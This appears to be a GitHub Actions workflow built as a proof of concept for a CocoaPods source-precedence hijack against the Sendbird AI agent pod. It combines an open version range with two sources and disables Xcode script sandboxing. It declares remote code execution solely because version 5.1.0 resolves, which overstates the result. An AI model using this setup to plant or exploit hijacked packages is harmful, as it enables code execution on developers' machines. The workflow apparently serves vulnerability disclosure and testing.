name: Sendbird Precedence Hijack Test
on: workflow_dispatch

jobs:
  verify_precedence:
    runs-on: macos-latest
    steps:
      - name: Setup Environment
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Replicate Sendbird Official Guide
        run: |
          mkdir sendbird_test && cd sendbird_test
          flutter create . --platforms=ios
          
          cd ios
          # 1. SETUP PODFILE PERSIS DOKUMENTASI RESMI
          # Kita masukin kedua source-nya
          echo "source 'https://github.com/sendbird/sendbird-ios-distribution.git'" > Podfile
          echo "source 'https://cdn.cocoapods.org/'" >> Podfile
          echo "platform :ios, '15.0'" >> Podfile
          
          echo "target 'Runner' do" >> Podfile
          echo "  use_frameworks!"
          # INI ADALAH BARIS DARI README RESMI MEREKA
          echo "  pod 'SendbirdAIAgentMessenger', '>= 1.13.0'" >> Podfile
          echo "end" >> Podfile

          # 2. DISABLE SANDBOX (Instruksi Resmi Sendbird)
          cat <<EOF >> Podfile
post_install do |installer|
  project = installer.aggregate_targets[0].user_project
  project.targets.each do |target|
      target.build_configurations.each do |config|
          config.build_settings['ENABLE_USER_SCRIPT_SANDBOXING'] = 'NO'
      end
  end
  project.save
end
EOF

          # 3. INSTALLATION: The Moment of Truth
          pod install --repo-update
          
          # 4. VERIFIKASI VERSI DI PODFILE.LOCK
          echo "=== ACTUAL RESOLVED VERSION ==="
          RESOLVED_VERSION=$(grep "SendbirdAIAgentMessenger (" Podfile.lock | head -1)
          echo "Resolved: $RESOLVED_VERSION"

          # 5. TRIGGER BUILD (RCE CHECK)
          flutter build ios --debug --no-codesign --verbose 2>&1 | tee build.log || true
          
          # 6. FINAL JUDGEMENT
          if echo "$RESOLVED_VERSION" | grep -q "5.1.0"; then
            echo "✅ TRUTH: CocoaPods prioritized Attacker's v5.1.0 over Official v1.13.0!"
            echo "✅ IMPACT: Remote Code Execution triggered successfully."
          else
            echo "❌ FAILED: System picked official version."
            exit 1
          fi
